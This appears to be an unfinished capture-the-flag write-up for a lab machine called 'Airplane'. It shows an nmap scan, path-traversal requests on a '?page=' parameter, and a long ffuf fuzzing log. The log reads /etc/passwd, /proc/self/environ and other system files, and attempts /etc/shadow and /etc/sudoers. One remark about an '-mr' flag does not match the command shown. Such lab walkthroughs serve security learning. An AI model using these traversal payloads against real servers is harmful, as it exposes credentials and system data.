# Airplane
## User Flag:

This is my first ever medium challenge that I tried, I first ran nmap to see what services I was dealing with

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So, there's an http service open on port 8000, so I added airplane.thm to my `/etc/hosts` and got to the website

<img width="1269" height="424" alt="image" src="https://github.com/user-attachments/assets/ac673e90-04cf-44c2-95c8-139c966c8cac" />

This website has nothing of interest visually. The only interesting thing I see is the query in the URL: `http://airplane.thm:8000/?page=index.html`

So I tried replacing index.html with ../ and it responded with Page not found. This lets me know that it's actually looking for other pages. So I queried for a page I knew would probably exist:

```
../etc/passwd -- Page not found
../../etc/passwd -- Page not found
../../../etc/passwd -- Page not found
../../../../etc/passwd -- ! Downloaded a file !
```

Suprisingly, when I tried to query for /etc/passwd, it downloaded the file off of the device. I was able to look inside and see that there are two other logins with a shell, **hudson** and **carlos**

When I try to download other files like `/etc/sudoers` and `/etc/shadow` they come up as a 500 internal service error

I then tried to do some fuzzing to see what files I could find and download with this: `ffuf -u 'http://10.67.144.36:8000?page=../../../../FUZZ' \ -w /home/kali/Desktop/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \ -fs 14`, I filtered the size to 14 since that's the length of the page not found,
which would still show normally, but on the backend the length is more.

(The reason I use -mr is because I want it to see what it can run as root)

```
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 65ms]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 61ms]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 72ms]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 76ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 73ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 76ms]
/etc/crontab            [Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 51ms]
/etc/apt/sources.list   [Status: 200, Size: 3158, Words: 337, Lines: 58, Duration: 47ms]
/etc/fstab              [Status: 200, Size: 564, Words: 75, Lines: 13, Duration: 46ms]
/etc/group              [Status: 200, Size: 1062, Words: 1, Lines: 77, Duration: 40ms]
/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 59ms]
/etc/hosts              [Status: 200, Size: 224, Words: 20, Lines: 11, Duration: 64ms]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 224, Words: 20, Lines: 11, Duration: 64ms]
/etc/hosts.deny         [Status: 200, Size: 711, Words: 128, Lines: 18, Duration: 61ms]
/etc/issue              [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 56ms]
/etc/mysql/my.cnf       [Status: 200, Size: 839, Words: 116, Lines: 24, Duration: 51ms]
/../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 51ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 51ms]
/etc/nsswitch.conf      [Status: 200, Size: 542, Words: 133, Lines: 21, Duration: 51ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 68ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 55ms]
/./././././././././././etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 52ms]
/etc/passwd             [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 78ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 77ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 77ms]
../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 55ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 57ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 55ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 55ms]
../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 73ms]
../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 85ms]
../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 74ms]
../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 73ms]
../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 74ms]
../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 85ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 59ms]
../../../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 74ms]
../etc/passwd           [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 65ms]
../../etc/passwd        [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 67ms]
../../../../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 83ms]
../../../etc/passwd     [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 68ms]
../../../../etc/passwd  [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 52ms]
etc/passwd              [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 62ms]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 66ms]
/etc/resolv.conf        [Status: 200, Size: 737, Words: 99, Lines: 20, Duration: 50ms]
/etc/rpc                [Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 50ms]
/etc/ssh/sshd_config    [Status: 200, Size: 3289, Words: 294, Lines: 124, Duration: 65ms]
/../../../../../../../../../../etc/shadow [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 65ms]
../../../../../../../../../../../../etc/shadow [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 65ms]
/etc/sudoers            [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 65ms]
/./././././././././././etc/shadow [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 67ms]
/etc/shadow             [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 64ms]
/proc/meminfo           [Status: 200, Size: 1475, Words: 542, Lines: 54, Duration: 50ms]
/proc/net/arp           [Status: 200, Size: 387, Words: 184, Lines: 6, Duration: 43ms]
/proc/interrupts        [Status: 200, Size: 1853, Words: 851, Lines: 35, Duration: 50ms]
/proc/net/dev           [Status: 200, Size: 446, Words: 247, Lines: 5, Duration: 50ms]
/proc/loadavg           [Status: 200, Size: 27, Words: 5, Lines: 2, Duration: 47ms]
/proc/cpuinfo           [Status: 200, Size: 2334, Words: 289, Lines: 55, Duration: 59ms]
/proc/self/cmdline      [Status: 200, Size: 24, Words: 1, Lines: 1, Duration: 54ms]
/proc/net/route         [Status: 200, Size: 512, Words: 290, Lines: 5, Duration: 54ms]
/proc/mounts            [Status: 200, Size: 3098, Words: 206, Lines: 42, Duration: 55ms]
/proc/partitions        [Status: 200, Size: 385, Words: 192, Lines: 14, Duration: 54ms]
/proc/version           [Status: 200, Size: 154, Words: 17, Lines: 2, Duration: 67ms]
/proc/self/status       [Status: 200, Size: 1330, Words: 89, Lines: 56, Duration: 67ms]
/proc/self/environ      [Status: 200, Size: 437, Words: 1, Lines: 1, Duration: 68ms]
/proc/net/tcp           [Status: 200, Size: 80700, Words: 32535, Lines: 539, Duration: 69ms]
/var/log/auth.log       [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 50ms]
/var/log/boot.log       [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 60ms]
/var/log/kern.log       [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 46ms]
/var/log/dmesg          [Status: 200, Size: 43711, Words: 6652, Lines: 583, Duration: 53ms]
/var/log/syslog         [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 47ms]
/var/run/utmp           [Status: 200, Size: 1152, Words: 1, Lines: 1, Duration: 56ms]
/var/log/wtmp           [Status: 200, Size: 15744, Words: 10, Lines: 2, Duration: 80ms]
/var/log/lastlog        [Status: 200, Size: 292584, Words: 1, Lines: 1, Duration: 43ms]
///////../../../etc/passwd [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 42ms]
:: Progress: [930/930] :: Job [1/1] :: 340 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

